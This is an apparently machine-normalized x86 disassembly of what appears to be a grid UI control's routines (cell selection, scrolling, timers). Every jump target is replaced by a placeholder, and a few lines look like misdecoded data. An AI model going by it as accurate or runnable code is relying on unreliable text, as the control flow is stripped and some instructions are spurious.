je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_473548
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_4754fc
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_4755e8 ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_474ad4
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_40349c
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_40349c
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_473fd4
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_4754fc
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_47670c
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_4763e0
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_4759a9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4435dc
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_472240
mov eax ebx
call sub_472230
jmp r-xdata
mov [ esi ] 0x0
sub_4759e8
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4768d4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_40349c
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_4721b0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455244
test eax eax
jne r-xdata
xor eax eax
push ebp
push j_sub_403740
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f3d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_473310
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40349c
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43e030
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4732b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_473d04
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_47497c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4748f4
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_47497c
mov eax [ ebp - 0x4 ]
call sub_4769b0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412988
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_472240
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412988
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_473e44
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40349c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_473e44
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetTimer
sub_475db4
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_473310
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4732b4
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f690
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_473d04
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_473d04
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4748f4
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412988
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_47620c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412988
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_47620c
jmp r-xdata
jmp r-xdata
sub_475f18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_475f70
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_4761fb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_40349c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_4769b0
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40349c
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_43f738
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476202
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_473310
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_473d04
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_473e44
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412988
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_40349c
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_475f18
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_475f18
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_4769b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_473e44
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412988
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_40349c
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_476814
mov eax [ ebp - 0x4 ]
call sub_477164
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_4764a4
mov eax [ ebp - 0x4 ]
call sub_477164
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_4725a8
mov eax [ ebp - 0x4 ]
call sub_477164
mov eax [ ebp - 0x4 ]
call sub_4769b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4769b0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_4724d0
mov eax [ ebp - 0x4 ]
call sub_477164
sub_47620c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_43d7fc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_473e44
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4746d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_473310
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_40349c
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4746d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_473310
mov eax ebx
call sub_473e44
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_476448
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_473b64
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_4765dc
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4764a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476542
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_471260
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476549
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_474b28
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_40349c
sub_476550
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_40349c
mov eax ebx
call sub_4742ac
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_471260
sub_47658c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_40349c
mov eax ebx
call sub_4742ac
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_471260
sub_4765dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476664
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47666b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_474228
mov eax ebx
call sub_4742ac
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
call sub_470e64
sub_476674
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4766fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476703
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_474228
mov eax ebx
call sub_4742ac
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
call sub_470e64
sub_47670c
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_472240
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_472230
pop ebx
retn
pop ebx
retn
call sub_4719c8
sub_476748
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_4742ac
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_47497c
mov eax ebx
call sub_472230
mov eax ebx
call sub_472240
jmp r-xdata
sub_4767d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_473b64
mov edx esi
dec edx
mov eax ebx
call sub_476674
sub_476814
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
